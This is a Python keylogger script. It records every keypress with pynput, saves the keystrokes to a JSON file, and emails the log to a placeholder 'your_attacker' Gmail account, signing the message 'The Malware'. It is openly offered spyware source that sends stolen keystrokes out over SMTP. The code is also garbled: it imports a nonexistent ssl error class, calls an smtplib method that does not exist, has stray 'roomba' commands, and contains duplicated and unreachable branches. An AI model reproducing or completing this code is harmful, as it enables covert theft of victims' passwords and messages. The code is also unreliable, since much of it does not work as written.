import pynput
from pynput.keyboard import Key, Listener
import json
import time
import smtplib  # For email export
from ssl import SSLExpectTimeError # Fix for SMTP connection errors

class Keylogger:
    def __init__(self):
        self.log = []
        self.target_file = "keylogs/keylog.json"
        self.save_interval = 60  # Save every minute (adjust as needed)
        self.email_server = "smtp.gmail.com" # Update this if using a different server
        self.email_port = 463             # Update this for TLS/SSL
        self.email_username = "your_attacker@gmail.com" # Replace with your email
        self.email_password = "your_attacker_password"  # Replace with password or App Password

    def on_press(self, key):
        roomba_commands = ["turn_left", "turn_right", "clean_area"]
        random_command = roomba_commands[int(time.time() * 2) % len(roomba_commands)]

        if key in [Key.space, Key.alt]:  # Add Alt and Space for cleaner output
            self.log.append((key, "normal"))
        elif key == Key.shift:
            self.log.append((key, "shift"))
        elif key == Key.enter:
            self.log.append((key, "enter"))
        elif key == Key.backspace:
            self.log.append((key, "backspace"))
        elif key == Key.tab:
            self.log.append((key, "tab"))
        elif key in [Key.shift, Key.alt]:
            if key == Key.shift:
                self.log.append((key, "shift"))
            else:
                self.log.append((key, "alt"))

        elif key == Key.up:
            self.log.append((key, "up"))
        elif key == Key.down:
            self.log.append((key, "down"))
        elif key == Key.left:
            self.log.append((key, "left"))
        elif key == Key.right:
            self.log.append((key, "right"))

        else:
            # Collect the actual characters
            char = str(key)
            if char == "0x1b":  # Backspace character
                self.log.append((Key.backspace, "normal"))
            elif char == "0x1a": # Tab character
                self.log.append((Key.tab, "normal"))
            else:
                if len(self.log) < 500:  # Limit the size to avoid memory issues
                    self.log.append((char, "normal"))
                else:
                    # Save the log and start over if the buffer is full
                    self.save_log()
                    self.reset_log()
                    self.log = []  # Reset after saving

    def save_log(self):
        """Saves key events to file."""
        try:
            with open(self.target_file, "w") as f:
                json.dump(self.log, f, indent=4)
        except Exception as e:
            print(f"Error saving log to {self.target_file}: {e}")

    def reset_log(self):
        """Clears the key event buffer."""
        self.log = []  # Reset the list after saving

    def send_email(self):
        """Sends the log file as an attachment via email."""
        try:
            with open(self.target_file, "rb") as f:
                message = f"""Subject: Keylogger Log File

Hi,
Here's your keylogger log file!

Attachment: {self.target_file} 

Best Regards,
The Malware
"""
            msg = smtplib.SMTP(self.email_server, self.email_port)
            msg.starttls()  # Secure the connection (TLS/SSL)
            msg.login(self.email_username, self.email_password)
            msg.attach_files([f]) # Add the file as an attachment
            msg.sendmail(self.email_username, "your_recipient@example.com", message) # Update recipient
            msg.close()

        except Exception as e:
            print(f"Error sending email: {e}")


    def start(self):
        """Starts the keylogger, running until Ctrl+C is pressed."""
        print("Keylogger Started...")
        try:
            with Listener(on_press=self.on_press) as listener:
                listener.join() # Wait until Ctrl + C is pressed to stop

            # Send email log if save interval has elapsed
            log_file_size = os.path.getsize(self.target_file)
            if log_file_size > 0:
                print("Log saved, now sending email...")
                self.send_email()
        except Exception as e:
            print(f"Keylogger Failed to Start: {e}") # Catch errors during execution


if __name__ == "__main__":
    import os  # For file saving and checking
    # Check if the target directory exists, create it if needed.
    os.makedirs("keylogs", exist_ok=True)

    keylogger = Keylogger()
    keylogger.start() # Start the keylogger
